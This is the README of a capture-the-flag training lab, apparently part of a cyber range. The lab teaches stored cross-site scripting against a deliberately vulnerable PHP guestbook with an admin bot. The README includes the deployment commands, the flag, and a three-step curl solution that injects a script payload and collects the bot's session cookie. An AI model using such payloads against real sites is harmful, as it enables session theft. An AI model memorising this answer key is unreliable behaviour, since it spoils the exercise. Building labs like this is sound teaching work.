# xss-stored — Stored XSS Cookie Theft Simulation

**Vulnerability:** PHP guestbook stores user input unsanitised; admin bot visits, cookie is stolen  
**Tool:** `curl`  
**Flag:** `WMG{xss_st0l3n_admin_s3ss10n}`

## Scenario

Ironwood Recruitment runs a PHP guestbook at `/guestbook.php`. Messages are
stored in `/var/www/data/messages.json` without HTML encoding and rendered
verbatim on the page. An admin bot (`/bot.php`) periodically visits the
guestbook and, if it detects a `collect.php` reference in any message, writes
its session cookie to `/var/www/data/collected.txt`. A separate endpoint
(`/collect.php`) returns the stolen cookie — which contains the flag.

The three-step exploit chain teaches stored XSS as it actually works: inject →
victim visits → exfiltrate.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/xss-stored/setup.yml
```

First run: `ok=11 changed=8`  
Second run: `ok=11 changed=3` (Apache restart + data file resets, by design)

## Verify

```bash
./agent-harness/verify.sh xss-stored
```

## Expected exploit

```bash
# Step 1: inject XSS payload into guestbook
curl -s -X POST http://127.0.0.1/guestbook.php \
  -d 'name=attacker&message=<script>document.location="http://127.0.0.1/collect.php"</script>'

# Step 2: trigger admin bot visit (simulates XSS firing in victim browser)
curl -s http://127.0.0.1/bot.php

# Step 3: retrieve stolen session cookie (contains the flag)
curl -s http://127.0.0.1/collect.php
# → WMG{xss_st0l3n_admin_s3ss10n}
```

## Training

`training.json` — 9 levels: web enumeration → guestbook discovery → XSS theory → payload injection → bot trigger → cookie exfiltration → ASSESSMENT.  
MITRE ATT&CK: T1059.007 (JavaScript), T1185 (Browser Session Hijacking).  
CyberRangeCZ subnet: 10.1.31.0/24
